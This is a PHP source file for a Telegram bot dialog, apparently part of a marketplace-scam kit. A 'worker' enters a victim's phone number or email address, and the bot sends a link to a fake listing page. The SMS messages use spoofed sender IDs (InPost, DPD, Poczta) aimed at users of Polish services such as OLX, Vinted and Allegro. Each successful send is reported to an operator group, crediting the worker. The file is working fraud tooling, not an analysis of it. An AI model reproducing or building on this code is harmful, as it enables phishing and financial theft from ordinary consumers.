<?php

namespace App\Telegram\Dialogs;

use App\Api\SmsApi;
use App\Mail\SendEmailFake;
use App\Models\Category;
use App\Models\TelegramUser;
use Illuminate\Support\Facades\Mail;
use Log;
use App\Models\Fake;
use Telegram\Bot\Keyboard\Keyboard;
use Telegram\Bot\Exceptions\TelegramSDKException;
use Telegram\Bot\Objects\Update;

class SendDialog extends Dialog
{
    /**
     * @var string
     */
    public $type;

    public function __construct(Update $update, ?TelegramUser $user)
    {
        parent::__construct($update, $user);
        $this->type = ($this->getData('type') === 'email') ? 'email' : 'sms';
        if ($this->type === 'email') $this->setSteps([
            'getFake',
            'sendEmail'
        ]);
    }

    protected $steps = [
        'getFake',
        'sendSms'
    ];

    public function getFake()
    {
        try {
            $btns = $this->getConfig('btns');
            $track_id = $this->getData('track_id');
            if (is_null($track_id)) {
                $text = "❗️ <b>Такой объявление не существует!</b>";
                $keyboard = Keyboard::make([
                    "keyboard" => [[["text" => $btns->get('start') ?? '']]],
                    "resize_keyboard" => true,
                    "one_time_keyboard" => false,
                ]);
                $this->end();
            } else {
                $text = ($this->type === 'email')
                    ? "❕ <i>Напишите почту получателя </i>"
                    : "❕ <i>Напишите номер телефона в формате </i><b>48889404173</b>";
                $keyboard = Keyboard::make([
                    "keyboard" => [[["text" => $btns->get('back') ?? '']]],
                    "resize_keyboard" => true,
                    "one_time_keyboard" => false,
                ]);
            }
            $this->telegram->sendMessage([
                "chat_id" => $this->getChat()->getId(),
                "text" => $text,
                "parse_mode" => "html",
                "reply_markup" => $keyboard
            ]);

        } catch (TelegramSDKException $e) {
            Log::error($e->getMessage());
        }
    }

    public function sendSms()
    {
        try {
            $btns = $this->getConfig()['btns'];
            $number = trim($this->update->getMessage()->getText());
            if (!empty($number) && preg_match("/^\+?[0-9]{6,14}$/", $number)) {
                $this->setData('number', $number);
                $this->setData('error', false);
                $data = $this->getData()->only(['track_id', 'number'])->toArray();
                $fake = Fake::whereTrackId($data['track_id'])->first();
                $link = SmsApi::getSlug($data['number'], $fake->link(false, true));
                if (parse_url($link, PHP_URL_SCHEME) === 'http') $link = str_replace('http://', 'https://', $link);
                switch ($fake->category->name) {
                    case Category::OLX:
                    case Category::VINTED:
                    case Category::INPOST:
                    case Category::ALLEGRO:
                        $senderID = 'InPost';
                        break;
                    case Category::DPD:
                        $senderID = 'DPD';
                        break;
                    case Category::POCZTA:
                        $senderID = 'Poczta';
                        break;
                    default:
                        $senderID = null;
                        break;
                }
                $result = SmsApi::sendSms($data['number'], "Zdobądź fundusze : https://$link", $senderID)->getData(true);
                if ($result['error']) {
                    $text = $this->makeText([
                        "❗️ <b>Ошибка</b>",
                        "",
                        "<i>{$result['msg']}</i>"
                    ]);
                } else {
                    $text = "<i>Сообщения успешно отправлен на номер</i> <b>{$data['number']}}</b>";
                    if ($alertId = $this->getConfig('groups.alert.id')) $this->telegram->sendMessage([
                        "chat_id" => $alertId,
                        "text" => makeText([
                            $text,
                            "🐵 Воркер: <b>{$this->getUser()->accountLinkVisibly()}</b>",
                        ]),
                        "parse_mode" => "html",
                    ]);
                }
                $keyboard = Keyboard::make([
                    "keyboard" => [
                        [["text" => $btns['start']]],
                    ],
                    "resize_keyboard" => true,
                    "one_time_keyboard" => false,
                ]);
                $this->telegram->sendMessage([
                    'chat_id' => $this->getChat()->getId(),
                    'text' => $text,
                    "parse_mode" => "html",
                    "reply_markup" => $keyboard
                ]);
            } else {
                $this->setData('error', true);
                $this->telegram->sendMessage([
                    'chat_id' => $this->getChat()->getId(),
                    'text' => "❗️ <i>Укажите правильный номер телефона</i>",
                    "parse_mode" => "html",
                ]);
                $this->jump('getFake');
                $this->proceed();
            }
        } catch (TelegramSDKException $e) {
            Log::error($e->getMessage());
        }
    }

    public function sendEmail()
    {
        try {
            $btns = $this->getConfig()['btns'];
            $email = trim($this->update->getMessage()->getText());

            if (!empty($email) && filter_var($email, FILTER_VALIDATE_EMAIL)) {
                $this->setData('email', $email);
                $this->setData('error', false);
                $data = $this->getData()->only(['track_id', 'email'])->toArray();
                $fake = Fake::whereTrackId($data['track_id'])->first();
                Mail::to($data['email'])->send(new SendEmailFake($fake));
                $text = "<i>Сообщения успешно отправлен на почту</i> <b>{$data['email']}</b>";
                if ($alertId = $this->getConfig('groups.alert.id')) $this->telegram->sendMessage([
                    "chat_id" => $alertId,
                    "text" => makeText([
                        $text,
                        "🐵 Воркер: <b>{$this->getUser()->accountLinkVisibly()}</b>",
                    ]),
                    "parse_mode" => "html",
                ]);
                $keyboard = Keyboard::make([
                    "keyboard" => [
                        [["text" => $btns['start']]],
                    ],
                    "resize_keyboard" => true,
                    "one_time_keyboard" => false,
                ]);
                $this->telegram->sendMessage([
                    'chat_id' => $this->getChat()->getId(),
                    'text' => $text,
                    "parse_mode" => "html",
                    "reply_markup" => $keyboard
                ]);

            } else {
                $this->setData('error', true);
                $this->telegram->sendMessage([
                    'chat_id' => $this->getChat()->getId(),
                    'text' => "❗️ <i>Укажите правильную почту</i>",
                    "parse_mode" => "html",
                ]);
                $this->jump('getFake');
                $this->proceed();
            }
        } catch (TelegramSDKException $e) {
            Log::error($e->getMessage());
        } catch (\Exception $e) {
            Log::error($e->getMessage());
            $this->telegram->sendMessage([
                'chat_id' => $this->getChat()->getId(),
                'text' => "❗️ <i>Попробуйте чуть позже</i>",
                "parse_mode" => "html",
            ]);
        }
    }
}